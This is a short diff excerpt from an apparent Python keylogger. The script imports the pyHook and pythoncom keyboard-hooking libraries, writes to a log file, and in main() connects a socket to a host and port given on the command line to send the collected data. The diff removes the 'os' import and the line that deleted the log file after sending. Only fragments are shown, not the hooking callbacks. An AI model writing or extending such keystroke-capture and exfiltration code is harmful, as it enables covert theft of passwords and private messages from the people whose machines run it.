@@ -9,7 +9,6 @@ Usage:
 """
 import argparse
 import logging
-import os
 import pyHook
 import pythoncom
 import socket
@@ -98,8 +97,6 @@ def main():
   s.connect((args.host_name, args.port_number))
   s.send(data)
   s.close()
-
-  os.remove(LOG_FILE_NAME)
 
 
 if __name__ == '__main__':
